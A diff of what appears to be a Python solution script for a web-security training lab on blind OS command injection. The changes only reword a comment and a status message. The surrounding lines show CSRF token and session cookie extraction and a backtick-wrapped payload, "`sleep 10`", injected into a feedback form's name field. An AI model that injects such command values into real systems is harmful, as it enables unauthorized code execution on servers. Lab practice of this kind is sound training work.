@@ -7,7 +7,7 @@
 # Lab: Blind OS command injection with time delays
 #
 # Steps: 1. Fetch the feedback page
-#        2. Extract csrf token and session cookie
+#        2. Extract the csrf token and session cookie
 #        3. Inject payload into the name field when submitting a feedback
 #           to cause a 10 second delay
 #        4. Wait for the response
@@ -48,7 +48,7 @@ session = injection.cookies.get("session")
 # extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", injection.text)[0]
 
-print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")
 
 # the payload to cause a 10 second delay
 payload = "`sleep 10`"
